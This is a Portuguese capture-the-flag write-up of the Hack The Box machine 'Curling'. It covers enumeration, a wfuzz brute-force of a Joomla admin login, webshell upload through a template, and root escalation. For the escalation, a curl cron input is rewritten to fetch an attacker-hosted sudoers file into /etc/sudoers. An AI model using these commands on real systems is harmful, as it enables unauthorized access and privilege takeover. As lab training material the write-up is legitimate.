---
title: "Hack The Box - Curling"
tags: [Linux,Easy,Web,Pspy]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/160>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Porta 80 -> Servidor Web

## Enumeração da porta 80

Abrindo a página verificamos a página default do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_web.png)

Como de costume, sempre é bom termos rodando algum tipo de enumeração enquanto verificamos outras portas e serviços, pensando nisso vou deixar rodando um `Wfuzz` na porta 80 pra descobrir diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_wfuzz.png)

Explicação Wfuzz:
> -c --> Exibir com cores

> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --> indicamos que o método será dicionário e o arquivo especificado

> --hc 404 --> Não vai exibir os arquivos que deram erro 404.

> -t 200 --> Quantidade de threads (pra ir mais rápido)

### Verificando o código fonte da página encontramos algo interessante `secret.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_web1.png)

Verificamos o que tem no `secret.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_web2.png)

Descobrimos o que significa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_base64.png)

### Verificamos no Wfuzz a pasta /administrator

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_web3.png)

### Muito bom, sabemos que é Joomla, mas agora qual versão?

> Sabemos pela estrutura padrão do Joomla que o arquivo de configuração dele que diz a versão se encontra nesse diretório

> administrator/manifests/files/joomla.xml

Descobrimos que a versão é 3.8.8

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_web4.png)

# Exploração

### Vamos procurar por exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_search.png)

Não encontramos pra essa versão específica que está instalada, dificilmente vai ser por aqui a exploração. Se lembrarmos lá em cima, quando encontramos o arquivo secret.txt ou até mesmo na página, o nome dela é Cewl, o nome de uma ferramenta para se fazer listas de dicionários a partir de um site.
Interessante, temos uma página de login e uma senha, só falta o login. Vamos fazer uma lista de possíveis usuários e tentar realizar um brute force nesse Joomla

### Primeiro passo é gerar a wordlist

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_cewl.png)

### Com a wordlist criada o segundo passo é capturarmos a requisição para brute force, para isso iremos utilizar o `BurpSuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_burp2.png)

> username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&a6089cdc201c0d3640ab8d94067f7c61=1

> 99fb082d992a92668ce87e5540bd20fa=eth13be04d3i2q3nssu26fqt7o

### Agora com o Wfuzz iremos realizar o Brute Force de login

> wfuzz -w cewl.lista -c --hc 200 -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&a6089cdc201c0d3640ab8d94067f7c61=1' -b '99fb082d992a92668ce87e5540bd20fa=eth13be04d3i2q3nssu26fqt7o' http://10.10.10.150/administrator/index.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_brute.png)

Descobrimos que há possivelmente alguma coisa com o nome `floris`

### Logamos com Floris

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris1.png)

### Agora logado no Joomla fica relativamente fácil de explorarmos

#### Vamos em `TEMPLATES`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris2.png)

#### Protostar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris3.png)

#### Podemos editar os arquivos existentes ou criar um novo, vamos *Criar um Novo*, clicamos em `New File`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris4.png)

#### Injetamos nosso shellcode dentro dele

##### Pegamos um webshell já existente na máquina para exucutar e mudamos IP e Porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_shell.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_shell1.png)

#### Adicionamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_floris6.png)

##### Executamos e ganhamos um shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_test.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_show.png)

# Escalação de Privilégio

### Verificando dentro da pasta home do floris temos um arquivo chamado *password_backup*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_back.png)

## Temos dois jeitos de resolver isso, o fácil e o difícil, vamos começar pelo fácil

### Jogamos essa saída dentro do `cyberchef`

> https://gchq.github.io/

Após vários testes conseguimos extrair o arquivo *password.txt*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_chef.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_chef1.png)

# Jeito mais difícil, fazendo na mão toda essa extração

Com o *xxd -r* ele faz o reverso do hex, transforma em oq era isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao.png)

Verificamos que é um arquivo *bzip*, então extraimos com o `bzcat`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao1.png)

Agora virou um arquivo *gzip*, com o `zcat` extraimos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao3.png)

Agora virou um arquivo *bzip2* com o `bzcat` extraimos de novo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao4.png)

Agora virou um arquivo *tar* com o comando `tar -xf` realizamos a extração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao5.png)

Lemos o `password.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_mao6.png)

### Logamos como floris

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_log.png)

## Escalação de Privilégio

## Novamente temos dois jeitos de escalar privilégio nela

### Primeiro modo: através de *cron*

### Na pasta home do usuario floris verificamos um arquivo chamado *input*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_input.png)

#### Esse arquivo me chamou a atenção de cara, pois pelo que parece ele está fazendo como se fosse uma requisição para o localhost e jogando para o arquivo report, que tal nós colocarmos pra ele ler o cronjob do root, pra ver se temos como explorar algo ali? Vamos lá então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_input1.png)

Vamos esperar agora 

> watch -n 1 cat report

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_report.png)

Descobrimos que ele faz um curl com a flag -K.

Verificamos que quer dizer isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_curl.png)

Então, ele "baixa" um arquivo de um servidor remoto e joga pra dentro da máquina... 
Interessante, será que podemos mudar por exemplo o arquivo *sudoers* e colocar um arquivo nosso manipulado, como por exemplo acrescentado ao sudo nosso usuário *floris*?
Vamos tentar

#### Copiando, alterando o sudoers e logando como root

Modificamos o sudoers

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_sudoers.png)

Ligamos nosso http server

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_sudoers2.png)

Modificamos o *input* e esperamos

> url = "http://10.10.16.119/sudoers"
> output = "/etc/sudoers"
> user-agent = "superagent/1.0"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_sudoers3.png)

Logamos como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_sudoers4.png)

#### Pegamos a flag de user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_user.png)

#### Pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_root.png)

### Nota 1

Podemos verificar esse cron através do `pspy`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_pspy.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_pspy1.png)

A partir dai começamos a verificar o que o -K faz e assim por diante

# Segundo modo para escalar privilégio

Através do `snap`, pela máquina ser Ubuntu ela vem com snap, verificando a versão dele, vemos que é uma versão vulnerável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_snap.png)

Procuramos por exploits para snap através do searchsploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_snap1.png)

Executamos o exploit e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_snap4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-curling/Curling_snap6.png)